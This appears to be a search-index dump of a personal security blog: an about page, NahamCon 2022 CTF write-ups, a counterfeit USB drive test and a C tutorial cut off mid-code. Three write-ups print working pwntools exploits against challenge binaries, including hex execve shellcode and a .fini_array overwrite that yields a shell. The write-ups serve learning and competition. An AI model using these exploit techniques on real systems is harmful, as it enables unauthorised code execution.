[{"content":"tl;dr, I\u0026rsquo;m an Electrical Engineer by day, Computer Hacker by night. sometimes my hacker side prevails and I\u0026rsquo;m hacking full shift, That\u0026rsquo;s how I usually drop in GPA. This is my hacker blog where I share my work, also a place where I post my thoughts, both in english and arabic.\n‚ú® Interests ‚ú® I usually say I love computers, It\u0026rsquo;s a really broad thing to say so I will try to go a bit deeper into what exactly I love about computers.\n1. from the ground up üß± From holes printed on cards programmed in fortran to vaccum tubes that are huge and crazy to transistors then MOSFETs, I love the history and progress we have made in computers, I\u0026rsquo;m saddened that I didn\u0026rsquo;t get to witness It too, I was just born after the DOS era, this doesn\u0026rsquo;t stop me from going full-caveman mode and learning 80\u0026rsquo;s tech though.\nA tweet of hegz claiming victorious after finally finding the 6502 parts he\u0026#39;s always dreamed of After years of searching the markets and by cheer coincidence, Finally got the parts for the 6502!\ntoo bad they\u0026#39;re not the WDC variants but I can\u0026#39;t complain. pic.twitter.com/qclLHYCZVb\n\u0026mdash; hegz (@hegzploit) May 24, 2022 It\u0026rsquo;s not all about retro computing, the hacking scene back in the day was also way more exciting, people could learn all it is to know about binary exploits in a weekend, stuff was way more approachable back then and we had amazing e-zines like phrack where a lot of cool stuff was born.\n2. binex üîß Binary exploits are another thing I love, I thought I would dedicate this section to talking more about them, I have already mentioned my love for low-level computing so It\u0026rsquo;s only natural that I would love low-level computer security stuff, famously known as Binary Exploitation, sometimes It falls under the domains of Systems Security for the layman out there.\nI don\u0026rsquo;t claim to be a master exploit developer, I\u0026rsquo;m still in my journey to be one, I\u0026rsquo;m pursuing my yellow belt in pwn.college ü•ã though I have slowed down a bit for the sake of my GPA.\n3. programming paradigms üé® I think programming is an art, and I love all the different styles of it, I will rank my favorite paradigms and languages below.\nFunctional ML - OCaml Lisp - Scheme/Clojure Descriptive Prolog Coq HDL Imperative/General Purpose C Python I don\u0026rsquo;t claim to be an expert at the above programming languages, I just respect their design and semantics. 4. content creation üéûÔ∏è I find it enjoyable, and I believe Its an effecient way to learn stuff properly, that\u0026rsquo;s why I have two youtube channels and this blog.\nI use my personal channel for anything I love to talk about and It\u0026rsquo;s mostly stuff related to my studies, new tools I learn and general Interests.\nMy hacking channel is exclusive cybersecurity stuff, mainly pwn.\nTooling üß∞ I believe tools are very important in our trade, they not only help us get jobs done but also we get to form little cults and brag about how our choice is superior to others!\n1. Vi/Vim learning Vim bindings is by far one of the greatest investments I did myself, I find myself doing a lot of weird text manipulations using Vim Wizardy that I\u0026rsquo;m not sure how I could\u0026rsquo;ve done otherwise, It also makes me look cool in front of others.\n2. Linux Linux is another big one in my arsenal, I used to fret a lot about distros and have tried almost every mainstream distro but in the end, It doesn\u0026rsquo;t matter a lot to me anymore, nowadays I onyl care about having a terminal ready, this is where most of my magic happens, regardless of the flavour of my Linux.\nHere\u0026rsquo;s a list of my boxes and their distros.\nMain PC: PopOS w/ Windows 11 Dualboot Main Laptop: MBP2012 with arch (this is my \u0026ldquo;I use arch btw\u0026rdquo; pass) Old 2009 HP Laptop: Voidlinux, I use this box as a server mostly. Philosophies üß† I will talk a bit about some philosophies/principles that I love to follow.\n1. It is no use crying over spilled milk You can\u0026rsquo;t tell Mommy what to do. You can\u0026rsquo;t tell Daddy what to do. Everyone will just get mad.\nYou can tell YOU what to do. Control yourself and everyone is happy!\nTame your emotions, become content with what you have, accept how things are and stop worrying about everything that is outside of your control. Now that you waste less time worrying you can focus on what matters.\nnote: I don\u0026#39;t condone smoking... 2. LMGTFY1 üîç In this era, one can find anything he wants on the internet, so please just use google the next time you want answers, I\u0026rsquo;m not a genius \u0026ldquo;Mr. know it all\u0026rdquo;, I just know how to use google better than you do.\n3. Don\u0026rsquo;t ask to ask ‚ÅâÔ∏è \u0026mdash;\u0026gt; https://dontasktoask.com\n4. No Hello üëã Click Me 5. The XY Problem The XY problem is asking about your attempted solution rather than your actual problem. This leads to enormous amounts of wasted time and energy, both on the part of people asking for help, and on the part of those providing help.\n\u0026mdash;\u0026gt; https://xyproblem.info\nEducation The way our educational system is built, It discourages any innovation and binds students to follow one path to get their share of society, I despise it and I will leave it at that, I can do nothing about it, I just gotta deal with it, this is why I try to balance between my boring academic life and the other things I do, It\u0026rsquo;s no easy feat. I might blog about this actually.\nNormie Me I also do other non-computer stuff, here I will talk about It.\n1. Anime üå∏ I watch a lot of anime, I could rank my top stuff here but I have an updated list over at MAL\n2. Cooking ü•ßü§å I enjoy cooking a lot, I mostly make dessert and sweet stuff, a cooking section is a WIP here, for now have a picture of my cheesecake.\nFirst classic cheesecake I made. 3. Gaming üëæ I\u0026rsquo;m not that big into gaming, I get bored really fast with most games, only two games have stuck with me: League of Legends (I know, I\u0026rsquo;m not proud of that one) and Minecraft.\nI\u0026rsquo;m usually down for trying new games, thought I hate games that require a lot of commitment, I already have a lot of things that waste my time than games so I would rather not add one more thing to the list.\nI love retro MMORPGs like RPG MO, I have also discovered Zachtronics and insta-bought Shenzhen I/O, It\u0026rsquo;s an amazing programming game and I\u0026rsquo;m looking forward to trying more of their games soon.\nshort for \u0026ldquo;Let me Google that for you\u0026rdquo;.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","description":"about me","id":2,"section":"","tags":null,"title":"$ whoami","uri":"/about/"},{"content":"Recording is sadly corrup, here\u0026rsquo;s the slides.\nSlides: https://hegz.me/how2hack.pdf\n","description":"Basic introduction to cybersecurity","id":3,"section":"talks","tags":null,"title":"Getting Started with Cybersecurity","uri":"/talks/how2hack/"},{"content":" Slides: https://hegz.me/binex.pdf\n","description":"","id":4,"section":"talks","tags":["pwn"],"title":"Once upon a Segfault","uri":"/talks/once_upon_a_segfault/"},{"content":"Checksec Canary : ‚úò NX : ‚úì PIE : ‚úò Fortify : ‚úò RelRO : Full We only care about the stack canary as we will be overflowing RIP to control execution flow, and thankfully It\u0026rsquo;s disabled.\nExploitation 1. RIP Control We overflow the binary with a cyclic pattern, however, for this being a 64-bit binary we can\u0026rsquo;t overflow RIP with a non-canonical address.\nCanonical Address An address is said to be canonical in the 64-bit world when the upper 16 bits are copies of the 48th bit. The easiest way to find the RIP offset without overflowing RIP is by breaking at the ret instruction and searching for our pattern in rsp.\n2. Writing our exploit Now we have all the pieces that we need to build our exploit, we will do the rest straight from pwntools.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * context.binary = e = ELF(\u0026#34;./babiersteps\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: pass else: io = e.process() OFFSET = 120 io.clean() io.fit( {120: e.sym.win} ) io.interactive() ","description":"A classic ret2win challenge on a 64-bit binary, overflow RIP with win() address to get flag.","id":5,"section":"posts","tags":["pwn","NahamCTF22"],"title":"Babiersteps","uri":"/posts/babiersteps/"},{"content":"Checksec It\u0026rsquo;s an aboslute mess, nothing is turned on fortunately :)\nCanary : ‚úò NX : ‚úò PIE : ‚úò Fortify : ‚úò RelRO : Partial Exploitation 1. EIP Control We obtain our offset very easily in GEF.\n2. Exploitation We start by analyzing the stack at the overflown state.\nLooking at the registers, It appears that only two registers point to our stack. eax and esp.\nWe search for gadgets jumping to any of these registers.\ngef‚û§ ropper --search jmp [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: jmp [INFO] File: /home/hegz/HDD/Cyber/CTF/NahamCon/Babysteps/babysteps 0x08049545: jmp eax; We find a jmp eax gadget, this is perfect.\neax seems to point to the start of our buffer too.\nKnowing that our offset to EIP is 28-bytes, this leaves us with two options:\nSqueeze a shellcode in these 28 bytes and execute it by jumping to the start of the buffer using the jmp eax gadget. Write our shellcode after the 28 bytes and pad the buffer with a NOP sled to our shellcode. Option 1 wasn\u0026rsquo;t successful due to the length of most execve shellcodes, the smallest execve shellcode I could find was 24-bytes in size and It leveraged the stack to expand further beyod these 24-bytes using multiple push instructions, this made my shellcode overflow itself, hence I was screaming at my keyboard on twitter.\nyou know you should stop when your overflown shellcode overflows itself...\n\u0026mdash; hegz (@hegzploit) April 29, 2022 This lead us to just pad the buffer with nops and put our shellcode after EIP.\nHere\u0026rsquo;s our exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * context.binary = e = ELF(\u0026#34;./babysteps\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#34;challenge.nahamcon.com\u0026#34;, 30369) elif args[\u0026#39;GDB\u0026#39;]: # Breaks at RTN instruction. io = gdb.debug(context.binary.path, f\u0026#34;\u0026#34;\u0026#34; b *0x080492d0 \u0026#34;\u0026#34;\u0026#34;) else: io = e.process() OFFSET = 28 jmp_eax = 0x08049545 # Shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php shellcode = b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; io.clean(0.5) io.fit( {OFFSET : p32(jmp_eax), OFFSET + 4 * 5 : shellcode}, filler=b\u0026#34;\\x90\u0026#34;) io.interactive() ","description":"A classic ret2shellcode with a twist, we use a gadget to execute our code off the stack. binary is 32-bit.","id":6,"section":"posts","tags":["pwn","NahamCTF22"],"title":"Babysteps","uri":"/posts/babysteps/"},{"content":"Checksec Canary : ‚úì NX : ‚úì PIE : ‚úò Fortify : ‚úò RelRO : ‚úò RelRO is completely disabled unlike any other challenge we have encountered, this means that we have write permessions to all the relocations.\nExploitation Running the binary will let us specify an address and a value and then It will assign that value to the adderss we provided.\nhegz@pop-os$ ./detour What: 1234 Where: 123123123213 Segmentation fault (core dumped) I confirmed this by analyzing the binary in ghidra, below is the decompilation.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 undefined8 main(void) { long in_FS_OFFSET; size_t local_20; long local_18; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\u0026#34;What: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00402013,\u0026amp;local_20); getchar(); printf(\u0026#34;Where: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_0040201f,\u0026amp;local_18); getchar(); *(size_t *)((long)\u0026amp;base + local_18) = local_20; if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } This is the part responsible of the write-what-where.\n1 *(size_t *)((long)\u0026amp;base + local_18) = local_20; It basically means that It will write the value we provide in local_20 at the address we provide at local_18 incremented by the address of base, this is important when crafting our exploit as we have to subtract the address of base from the address we provide to get the correct address in the binary.\nWe also have a function that will execute a shell in our binary.\n1 2 3 4 5 6 void win(void) { system(\u0026#34;/bin/sh\u0026#34;); return; } Now we only need to locate the address that we will be writing to in order to redirect execution to our win() function.\nThe GOT is one good attack vector but we don\u0026rsquo;t call any libc function (except __stack_chk_fail) after our write-what-where, this means that overwriting the GOT is useless since the overwritten GOT entry will never be referenced anyway.\nThe less obvious attack vector is the global destructor for our program, this is possible due the fact that we have write permissions to the binary relocations.\nThe global destructor is a routine that gets called when our main function is exiting.\nHere is the backtrace of the binary after successfully ovewrwriting the global destructor.\n1 2 3 4 5 6 7 8 9 10 [#0] 0x7ffff7e5c6ea ‚Üí __GI___wait4(pid=0xddb6b, stat_loc=0x7fffffffd8d8, options=0x0, usage=0x0) [#1] 0x7ffff7e5c6ab ‚Üí __GI___waitpid(pid=\u0026lt;optimized out\u0026gt;, stat_loc=0x7fffffffd8d8, options=0x0) [#2] 0x7ffff7dc394b ‚Üí do_system(line=\u0026lt;optimized out\u0026gt;) [#3] 0x40121d ‚Üí win() [#4] 0x7ffff7fd9f03 ‚Üí _dl_fini() [#5] 0x7ffff7db84e5 ‚Üí __run_exit_handlers(status=0x0, listp=0x7ffff7f8c818 \u0026lt;__exit_funcs\u0026gt;, run_list_atexit=0x1, run_dtors=0x1) [#6] 0x7ffff7db8660 ‚Üí __GI_exit(status=\u0026lt;optimized out\u0026gt;) [#7] 0x7ffff7d9cfd7 ‚Üí __libc_start_call_main(main=0x401220 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffde88) [#8] 0x7ffff7d9d07d ‚Üí __libc_start_main_impl(main=0x401220 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffde88, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffde78) [#9] 0x40111e ‚Üí _start() It is present in the .fini_array section under the symbol name __do_global_dtors_aux_fini_array_entry\nTime to craft our exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pwn import * context.binary = e = ELF(\u0026#34;./detour\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#34;challenge.nahamcon.com\u0026#34;, 32149) elif args[\u0026#39;GDB\u0026#39;]: # Breaks at RTN instruction. io = gdb.debug(context.binary.path, f\u0026#34;\u0026#34;\u0026#34; b *main+143 \u0026#34;\u0026#34;\u0026#34;) else: io = e.process() what = str(e.symbols.win) where = str(e.sym.__do_global_dtors_aux_fini_array_entry - e.sym.base) info(f\u0026#34;Overwriting: {where} with {what}\u0026#34;) io.clean(1) io.sendline(what) io.clean(1) io.sendline(where) io.interactive() ","description":"A write-what-where scenario that enables us to overwrite the destructor (dtor) in the relocations table with our win() function to get a shell.","id":7,"section":"posts","tags":["pwn","NahamCTF22"],"title":"Detour","uri":"/posts/detour/"},{"content":" Serial Output 00110011 00111001 00110100 00110010 00101110 00110100 01100100 01100011 00110111 01101101 01100101 01100111 01100010 00110110 00110011 01100110 01100010 01100001 00110111 01100100 01100100 01100000 00110011 01100010 00110110 01100110 00110000 01100111 00110011 01100011 01100111 01100111 00110001 01101101 01100001 00110111 00110110 00101000 Wiring Diagram Arduino Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 char * flag = \u0026#34;REDACTED\u0026#34;; String curr, first, second; int in1=29, in2=27, in3=25, in4=23; int out1=53, out2=51, out3=49, out4=47; int i; String get_output(String bits) { String output; digitalWrite(out1, ((bits[0] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out2, ((bits[1] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out3, ((bits[2] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out4, ((bits[3] == \u0026#39;1\u0026#39;)? HIGH : LOW)); delay(1000); output += String(digitalRead(in1)); output += String(digitalRead(in2)); output += String(digitalRead(in3)); output += String(digitalRead(in4)); return output; } //converts a given number into binary String binary(int number) { String r; while(number!=0) { r = (number % 2 == 0 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;)+r; number /= 2; } while ((int) r.length() \u0026lt; 8) { r = \u0026#34;0\u0026#34;+r; } return r; } void setup() { i = 0; pinMode(out1, OUTPUT); pinMode(out2, OUTPUT); pinMode(out3, OUTPUT); pinMode(out4, OUTPUT); pinMode(in1, INPUT); pinMode(in2, INPUT); pinMode(in3, INPUT); pinMode(in4, INPUT); Serial.begin(9600); } void loop() { if (i \u0026lt; strlen(flag)) { curr = binary(flag[i]); first = curr.substring(0,4); second = curr.substring(4,8); Serial.print(get_output(first)); Serial.println(get_output(second)); delay(1000); i++; } } Looking at the code we can break it down into a couple of steps:\nloop over the flag covnerting each character into an 8-bit binary number split the 8-bit binary number to two 4-bit binary numbers perform a series of XOR operations that are hardwired in the wiring diagram to each 4-bits. print the XOR\u0026rsquo;d 8-bit binary number to the serial Refering to the datasheet of the XOR chip and the wiring diagram, we could identify our inputs and outputs and model the circuit in python.\nHere\u0026rsquo;s the pinout of the chip.\nXOR is a reversible operation so we can easily pass the encrypted flag to the encryption algorithm to get it decrypted.\nBelow is the decryption script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/env python3 # This function will decode a 4-bit binary number passed as a string def decode(bin_int): in1, in2, in3, in4 = [i for i in bin_int] out2 = int(in2) ^ 1 out1 = int(in1) ^ 0 out3 = 0 ^ int(in3) out4 = 1 ^ int(in4) out = [] out.append(out1) out.append(out2) out.append(out3) out.append(out4) out = [str(i) for i in out] return \u0026#34;\u0026#34;.join(out) # wrapper for the decode() function that splits a 8-bit binary number and # passes it to the decoding function returning the decrypted number. def trans(big_bin): bin1, bin2 = big_bin[:len(big_bin)//2], big_bin[len(big_bin)//2:] return(int(decode(bin1) + decode(bin2), 2)) flag = [] with open(\u0026#34;output.txt\u0026#34;) as f: encrypted = f.read().split() flag = [chr(trans(i)) for i in encrypted] print(\u0026#34;\u0026#34;.join(flag)) hegz@pop-os$ python3 solver.py flag{a16b8027cf374b115f7c3e2f622d84bc} ","description":"A hardware challenge where we're given some serial output from a Arduino and the corresponding wiring diagram and encryption source code.","id":8,"section":"posts","tags":["pwn","NahamCTF22"],"title":"Dweeno","uri":"/posts/dweeno/"},{"content":"First Impressions I was really tempted to just plug that bad boy into my main PC, but I was worried It might do something funny, I didn\u0026rsquo;t rush and instead booted a trusy old HP Pavilion I had around and booted it up, and ran a quick lsblk to list the devices connected.\nWe can clearly see that sdb1 with 1.9TBs of storage, but is that all?\nDigging Deeper Fight Flash Fraud, or rather f3, is a suite of command line utilities that aids in detecting and verifying USB flash drives.\nIt consits of mutiple tools, mainly:\nf3probe\nThis runs a quick capacity test on the flash drive\nf3fix\nCorrects the flash drive\u0026rsquo;s capacity to the actual size\nf3write\nWrites large files to the flash drive\nf3read\nChecks the written files integrity\nFirst run of f3probe\n$ sudo f3probe --destructive --time-ops /dev/sdb F3 probe 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. WARNING: Probing normally takes from a few seconds to 15 minutes, but it can take longer. Please be patient. Bad news: The device `/dev/sdd\u0026#39; is a counterfeit of type limbo You can \u0026#34;fix\u0026#34; this device using the following command: f3fix --last-sec=2147483647 /dev/sdd Device geometry: *Usable* size: 1.00 TB (2147483648 blocks) Announced size: 1.91 TB (4096000000 blocks) Module: 2.00 TB (2^41 Bytes) Approximate cache size: 1.00 MB (2048 blocks), need-reset=no Physical block size: 512.00 Byte (2^9 Bytes) Probe time: 6.01s Operation: total time / count = avg time Read: 187.5ms / 4213 = 44us Write: 5.82s / 22706 = 256us Reset: 0us / 1 = 0us The tool says that our flash drive is only 1TB, however, this was still too good to be true to me so I reran the command multiple time and the following was the output.\n$ sudo f3probe --destructive --time-ops /dev/sdb F3 probe 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. WARNING: Probing normally takes from a few seconds to 15 minutes, but it can take longer. Please be patient. Bad news: The device `/dev/sdd\u0026#39; is a counterfeit of type limbo You can \u0026#34;fix\u0026#34; this device using the following command: f3fix --last-sec=101781503 /dev/sdd Device geometry: *Usable* size: 48.53 GB (101781504 blocks) Announced size: 1.91 TB (4096000000 blocks) Module: 2.00 TB (2^41 Bytes) Approximate cache size: 255.00 MB (522240 blocks), need-reset=no Physical block size: 512.00 Byte (2^9 Bytes) Probe time: 6\u0026#39;11\u0026#34; Operation: total time / count = avg time Read: 16.48s / 1049168 = 15us Write: 5\u0026#39;54\u0026#34; / 5749135 = 61us Reset: 0us / 2 = 0us This makes more sense, I ran the fixing command it mentions in the output above, this corrects the capacity to the actual.\nf3fix --last-sec=101781503 /dev/sdd I was still worried of the integrity of these 48 GBs so I ran f3write on the mount point.\n$ f3write /media/hegz/SUSB/ F3 write 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. Free space: 1.91 TB Creating file 1.h2w ... OK! Creating file 2.h2w ... OK! Creating file 3.h2w ... OK! Creating file 4.h2w ... OK! Creating file 5.h2w ... OK! Creating file 6.h2w ... OK! Creating file 7.h2w ... OK! Creating file 8.h2w ... OK! Creating file 9.h2w ... OK! Creating file 10.h2w ... OK! Creating file 11.h2w ... OK! Creating file 12.h2w ... OK! Creating file 13.h2w ... OK! Creating file 14.h2w ... OK! Creating file 15.h2w ... OK! Creating file 16.h2w ... OK! Creating file 17.h2w ... OK! Creating file 18.h2w ... OK! Creating file 19.h2w ... OK! Creating file 20.h2w ... OK! Creating file 21.h2w ... OK! Creating file 22.h2w ... OK! Creating file 23.h2w ... OK! Creating file 24.h2w ... OK! Creating file 25.h2w ... OK! Creating file 26.h2w ... OK! Creating file 27.h2w ... OK! Creating file 28.h2w ... OK! Creating file 29.h2w ... OK! Creating file 30.h2w ... OK! Creating file 31.h2w ... OK! Creating file 32.h2w ... OK! Creating file 33.h2w ... OK! Creating file 34.h2w ... OK! Creating file 35.h2w ... OK! Creating file 36.h2w ... OK! Creating file 37.h2w ... OK! Creating file 38.h2w ... OK! Creating file 39.h2w ... OK! Creating file 40.h2w ... OK! Creating file 41.h2w ... OK! Creating file 42.h2w ... OK! Creating file 43.h2w ... OK! Creating file 44.h2w ... OK! Creating file 45.h2w ... OK! Creating file 46.h2w ... OK! Creating file 47.h2w ... OK! Creating file 48.h2w ... OK! Creating file 49.h2w ... Write failure: Input/output error WARNING: The write error above may be due to your memory card overheating under constant, maximum write rate. You can test this hypothesis touching your memory card. If it is hot, you can try f3write again, once your card has cooled down, using parameter --max-write-rate=2048 to limit the maximum write rate to 2MB/s, or another suitable rate. Creating file 50.h2w ... 2.46% -- 8.64 MB/s -- 84:20:56f3write: libflow.h:89: get_rem_chunk_size: Assertion `fw-\u0026gt;blocks_per_delay \u0026gt; fw-\u0026gt;processed_blocks\u0026#39; failed. Aborted (core dumped) This took around 3 hours to finish, I then ran f3read.\n$ f3read /media/hegz/SUSB/ F3 read 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. SECTORS ok/corrupted/changed/overwritten Validating file 1.h2w ... 2097152/ 0/ 0/ 0 Validating file 2.h2w ... 2097152/ 0/ 0/ 0 Validating file 3.h2w ... 2097152/ 0/ 0/ 0 Validating file 4.h2w ... 2097152/ 0/ 0/ 0 Validating file 5.h2w ... 2097152/ 0/ 0/ 0 Validating file 6.h2w ... 2097152/ 0/ 0/ 0 Validating file 7.h2w ... 2097152/ 0/ 0/ 0 Validating file 8.h2w ... 2097152/ 0/ 0/ 0 Validating file 9.h2w ... 2097152/ 0/ 0/ 0 Validating file 10.h2w ... 2097152/ 0/ 0/ 0 Validating file 11.h2w ... 2097152/ 0/ 0/ 0 Validating file 12.h2w ... 2097152/ 0/ 0/ 0 Validating file 13.h2w ... 2097152/ 0/ 0/ 0 Validating file 14.h2w ... 2097152/ 0/ 0/ 0 Validating file 15.h2w ... 2097152/ 0/ 0/ 0 Validating file 16.h2w ... 2097152/ 0/ 0/ 0 Validating file 17.h2w ... 2097152/ 0/ 0/ 0 Validating file 18.h2w ... 2097152/ 0/ 0/ 0 Validating file 19.h2w ... 2097152/ 0/ 0/ 0 Validating file 20.h2w ... 2097152/ 0/ 0/ 0 Validating file 21.h2w ... 2097152/ 0/ 0/ 0 Validating file 22.h2w ... 2097152/ 0/ 0/ 0 Validating file 23.h2w ... 2097152/ 0/ 0/ 0 Validating file 24.h2w ... 2097152/ 0/ 0/ 0 Validating file 25.h2w ... 2097152/ 0/ 0/ 0 Validating file 26.h2w ... 2097152/ 0/ 0/ 0 Validating file 27.h2w ... 2097152/ 0/ 0/ 0 Validating file 28.h2w ... 2097152/ 0/ 0/ 0 Validating file 29.h2w ... 2097152/ 0/ 0/ 0 Validating file 30.h2w ... 2097152/ 0/ 0/ 0 Validating file 31.h2w ... 2097152/ 0/ 0/ 0 Validating file 32.h2w ... 2097152/ 0/ 0/ 0 Validating file 33.h2w ... 2097152/ 0/ 0/ 0 Validating file 34.h2w ... 2097152/ 0/ 0/ 0 Validating file 35.h2w ... 2097152/ 0/ 0/ 0 Validating file 36.h2w ... 2097152/ 0/ 0/ 0 Validating file 37.h2w ... 2097152/ 0/ 0/ 0 Validating file 38.h2w ... 2097152/ 0/ 0/ 0 Validating file 39.h2w ... 2097152/ 0/ 0/ 0 Validating file 40.h2w ... 2097152/ 0/ 0/ 0 Validating file 41.h2w ... 2097152/ 0/ 0/ 0 Validating file 42.h2w ... 2097152/ 0/ 0/ 0 Validating file 43.h2w ... 2097152/ 0/ 0/ 0 Validating file 44.h2w ... 2097152/ 0/ 0/ 0 Validating file 45.h2w ... 2097152/ 0/ 0/ 0 Validating file 46.h2w ... 2097152/ 0/ 0/ 0 Validating file 47.h2w ... 2097152/ 0/ 0/ 0 Validating file 48.h2w ... 2097152/ 0/ 0/ 0 Validating file 49.h2w ... 114938/ 0/ 0/ 0 - NOT fully read due to \u0026#34;Input/output error\u0026#34; Validating file 50.h2w ... 0/ 0/ 0/ 0 Data OK: 48.05 GB (100778234 sectors) Data LOST: 0.00 Byte (0 sectors) Corrupted: 0.00 Byte (0 sectors) Slightly changed: 0.00 Byte (0 sectors) Overwritten: 0.00 Byte (0 sectors) WARNING: Not all data was read due to I/O error(s) Average reading speed: 31.29 MB/s This confirms that the actual usable size of my USB is 48GB.\n","description":"I found a listing for a 2TB usb flash drive on AliExpress for less than $3 I bought It and after 24 days, I recieved my order and started analyzing it, little did I know a surprise was waiting for me.","id":9,"section":"posts","tags":null,"title":"Fighting counterfeit USB Flash Drives","uri":"/posts/counterfeit-usbs/"},{"content":"A lot of people are driven by emotions, logical thinking doesn\u0026rsquo;t always result in agreement, in fact, most people are more influenced by emotions than logic, does that make logical thinking uselss.\nIt depends on a lot of factors, you shouldn\u0026rsquo;t boldly assume that logic works with everyone, a good strategy to get your message through might be analyzing the recipient, before deciding on your means of communication.\nThat\u0026rsquo;s a useful skill If you have to deal with multitude of different people, life is all about balancing things and overdoing is never wise.\n","description":"eh","id":10,"section":"posts","tags":["thoughts"],"title":"Emotion and Logic","uri":"/posts/emotion-vs-logic/"},{"content":"I was having a chit-chat with a friend discussing some C language shenanigans\nwhen he sent me a code snippet, he wanted me fix the code and get it to work in\n4 different ways.\nHere is the snippet:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y); int main(void){ int x = 10, y = 50; printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y){ int sum = x + y; int mul = x * y; } There are two main takeaways from the above snippet:\nThe calc function is never called in main. Even if we called it in main, the sum and mul variables are locals to the\nscope of calc. The obvious solution to me was to just make these variables globals then we can\njust call calc in main and we\u0026rsquo;re done, but he wanted me to do it in 4\ndifferent ways, that was clearly an exercise of passing values around in C.\nUsing Global Variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; int sum, mul; void calc (int x, int y); int main(void){ int x = 10, y = 50; calc(x, y); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y){ sum = x + y; mul = x * y; } Output\nsum=60 mult=500\nThis is pretty simple, by making the sum and mul variables global, we just\nexpand their scope to the whole program.\nUsing Pointers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y, int *sum, int *mul); int main(void){ int x = 10, y = 50; int sum, mul; calc(x, y, \u0026amp;sum , \u0026amp;mul); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y, int *sum, int *mul){ *sum = x + y; *mul = x * y; } In this solution we declared these variables in the main function and\npassed them by pointers (i.e. we passed a reference to their location in\nmemory), by doing this we can freely modify a variable from another scope since\nwe directly access the variable\u0026rsquo;s location in memorey.\ni.e. we dereference a memory address and modify the value that the address is\npointing to.\nBonus: Passing by Reference (C++) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y, int \u0026amp;sum, int \u0026amp;mul); int main(void){ int x = 10, y = 50; int sum, mul; calc(x, y, sum , mul); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); return 0; } void calc (int x, int y, int \u0026amp;sum, int \u0026amp;mul){ sum = x + y; mul = x * y; } C++ allows us to directly pass the address of sum and mul without using\npointers, we just pass them by reference.\nThat\u0026rsquo;s why I think people should be careful of using the terms \u0026ldquo;pass-by-pointer\u0026rdquo;\nand \u0026ldquo;pass-by-reference\u0026rdquo; interchangeably as these are two different things.\nUsing Arrays 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; int calc (int x, int y, int *result); int main(void){ int x = 10, y = 50; int result[2]; calc(x, y, result); printf(\u0026#34;sum=%d \u0026#34;, result[0]); printf(\u0026#34;mult=%d\u0026#34;, result[1]); } int calc (int x, int y, int *result){ int sum = x + y; int mul = x * y; result[0] = sum; result[1] = mul; } Passing values with arrays are useful when our values have the same type, It is\nvery similar to passing by pointer/reference since we actually pass the address\nof the array to the calc function, It\u0026rsquo;s values is then modified using the\narray notation my_array[index] = value which is really equivalent to\n*(my_array + index) = value.\nUsing Structs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; struct Result{ int sum, mul; }; struct Result calc (int x, int y); void main(void){ int x = 10, y = 50; struct Result result = calc(x, y); 